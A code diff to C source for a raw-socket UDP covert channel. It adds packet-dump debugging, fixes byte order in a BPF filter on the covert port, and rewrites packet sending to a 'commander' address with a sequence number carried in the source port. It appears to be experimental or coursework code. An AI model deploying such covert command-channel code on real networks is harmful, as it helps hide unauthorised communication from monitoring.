@@ -24,6 +24,52 @@
 #define IP_HDR_TOS 0
 #define IP_HDR_TTL 64
 
+void print_packet_info(uint8_t *packet) {
+    struct iphdr *ip = (struct iphdr *)packet;
+    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
+    uint8_t *payload = (uint8_t *)udp + sizeof(struct udphdr);
+
+    char src_ip[INET_ADDRSTRLEN];
+    char dst_ip[INET_ADDRSTRLEN];
+
+    inet_ntop(AF_INET, &ip->saddr, src_ip, INET_ADDRSTRLEN);
+    inet_ntop(AF_INET, &ip->daddr, dst_ip, INET_ADDRSTRLEN);
+
+    uint16_t ip_len = ntohs(ip->tot_len);
+    uint16_t udp_len = ntohs(udp->len);
+    uint16_t payload_len = udp_len - sizeof(struct udphdr);
+
+    printf("-----------------------Packet Info-----------------------\n");
+
+    printf("IP Header:\n");
+    printf("  Version        : %u\n", ip->version);
+    printf("  Header Length  : %u bytes\n", ip->ihl * 4);
+    printf("  TOS            : %u\n", ip->tos);
+    printf("  Total Length   : %u\n", ip_len);
+    printf("  ID             : %u\n", ntohs(ip->id));
+    printf("  TTL            : %u\n", ip->ttl);
+    printf("  Protocol       : %u\n", ip->protocol);
+    printf("  Source IP      : %s\n", src_ip);
+    printf("  Destination IP : %s\n", dst_ip);
+
+    printf("\nUDP Header:\n");
+    printf("  Source Port    : %u\n", ntohs(udp->source));
+    printf("  Dest Port      : %u\n", ntohs(udp->dest));
+    printf("  Length         : %u\n", udp_len);
+
+    printf("\nPayload (%u bytes):\n", payload_len);
+    for (uint16_t i = 0; i < payload_len; i++) {
+        printf("%02x ", payload[i]);
+        if ((i + 1) % 16 == 0)
+            printf("\n");
+    }
+
+    if (payload_len % 16 != 0)
+        printf("\n");
+
+    printf("---------------------------------------------------------\n");
+}
+
 int setup_covert_fd() {
     int fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
     if (fd == -1) {
@@ -47,7 +93,7 @@ int setup_covert_fd() {
         BPF_STMT(BPF_ALU | BPF_LSH | BPF_K, 2),
 
         BPF_STMT(BPF_LD  | BPF_H | BPF_IND, 2),
-        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, COVERT_CHAN, 0, 1),
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, htons(COVERT_CHAN), 0, 1),
 
         BPF_STMT(BPF_RET | BPF_K, 0xFFFFFFFF),
         BPF_STMT(BPF_RET | BPF_K, 0),
@@ -83,36 +129,41 @@ unsigned short checksum(void *b, int len) {
 }
 
 int send_packet(struct Context *ctx, const char *ip_src_addr) {
-    uint16_t *udp_src_port = &ctx->cmd_seq_num;
-
-    uint8_t packet[PKT_MAX_LEN];
+    uint8_t packet[PKT_MAX_LEN] = {0};
 
     struct iphdr *ip = (struct iphdr *)packet;
+    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
+    uint8_t *payload = (uint8_t *) udp + sizeof (struct udphdr);
+    const uint16_t payload_size = rand_payload(ctx, payload);
+    const uint16_t pkt_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
+
     ip->ihl = IP_IHL;
     ip->version = IP_VERSION;
     ip->tos = IP_HDR_TOS;
-    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr));
-    ip->id = htons((uint16_t)rand());
+    ip->tot_len = htons(pkt_len);
+    ip->id = htons(rand_u16(ctx));
     ip->frag_off = IP_FRAG_OFF;
     ip->ttl = IP_HDR_TTL;
     ip->protocol = IPPROTO_UDP;
     ip->saddr = inet_addr(ip_src_addr);
     ip->daddr = inet_addr(ctx->commander_ip);
-    ip->check = checksum(ip, sizeof(struct iphdr));
-    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
-    udp->source = htons(*udp_src_port);
+    checksum(ip, ip->ihl * 4);
+    udp->source = htons(ctx->cmd_seq_num);
     udp->dest = htons(COVERT_CHAN);
-    udp->len = htons(sizeof(struct udphdr));
+    udp->len = htons(sizeof(struct udphdr) + payload_size);
     udp->check = 0;
 
-    struct sockaddr_in dest;
-    memset(&dest, 0, sizeof(dest));
+    struct sockaddr_in dest = {0};
     dest.sin_family = AF_INET;
-    dest.sin_port = udp->dest;
+    dest.sin_port = htons(COVERT_CHAN);
     dest.sin_addr.s_addr = ip->daddr;
 
-    sendto(ctx->covert_fd, packet, sizeof(struct iphdr)+sizeof(struct udphdr), 0, (struct sockaddr *)&dest, sizeof(dest));
-    (*udp_src_port)++;
+    int ret = sendto(ctx->covert_fd, packet, pkt_len, 0, (struct sockaddr *)&dest, sizeof(dest));
+    if (ret <= 0) {
+        fprintf(stderr, "sento error\n");
+    }
+    print_packet_info(packet);
+    (ctx->cmd_seq_num)++;
 
     return 0;
 }
